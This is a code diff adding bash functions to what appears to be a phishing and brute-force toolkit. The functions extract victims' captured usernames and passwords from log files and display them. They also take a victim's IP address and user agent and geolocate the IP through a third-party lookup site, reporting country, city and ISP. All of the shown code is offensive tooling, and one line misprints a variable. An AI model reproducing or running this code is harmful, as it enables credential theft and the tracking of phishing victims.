@@ -154,4 +154,73 @@ chk-hydra() {
 }
 export -f chk-hydra
 
+phishing-CredsResults() {
+	ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
+	if [ ! -z $ACCOUNT ]; then
+		printf "$G[+]-> ACCOUNT:$W\t$ACCOUNT"
+		sleep 0.5
+	fi
+	PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
+	if [ ! -z $PASSWD ]; then
+		printf "$G[+]-> PASSWORD:$W\t$PASSWD"
+		sleep 0.5
+	fi
+}
+export -f phishing-CredsResults
 
+phishing-IPresults() {
+IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
+IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11: Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)
+
+if [ ! -z $IP ]; then 
+	printf "$G[+]-> IP:$W\t$IP"
+	sleep 0.5
+fi
+
+UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
+if [ ! -z $UA ]; then
+	printf "$G[+]-> User Agent$W\t$UA"
+	sleep 0.5
+fi
+IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [ ! -z $IP_SPEED ]; then
+	printf "$G[+]-> IP Address speed:$W\t$IP_SPEED"
+	sleep 0.5
+fi
+IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [ ! -z $IP_CURRENCY ]; then
+	printf "$G[+]> IP Currency:$W\t$IP_CURRENCY"
+	sleep 0.5
+fi
+CONTINENT=$(grep -o "Continent.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "<" -f1)
+if [ ! -z $CONTINENT ]; then
+	printf "$G[+]-> Continent:$W\t$CONTINENT"
+	sleep 0.5
+fi
+COUNTRY=$(grep -o "Country:.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+if [ ! -z $COUNTRY ]; then
+	printf "$G[+]-> Country:$W\t$COUNTRY"
+	sleep 0.5
+fi
+STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+if [ ! -z $STATE ]; then
+	printf "$G[+]-> State:$W\t$STATE"
+	sleep 0.5
+fi
+CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [ ! -z $CITY ]; then
+	printf "$G[+]-> City:$W\t$CITY"
+	sleep 0.5
+fi
+ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [ ! -z $ISP ]; then
+	printf "$G[+]-> ISP:$W\t$IPS"
+	sleep 0.5
+fi
+AS_NUM=$(grep -o "AS Number" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [ ! -z $AS_NUM ]; then
+	printf  "$G[+]-> AS Number:$W\t$AS_NUM"
+	sleep 0.5 
+fi
+}
+export -f phishing-IPresults
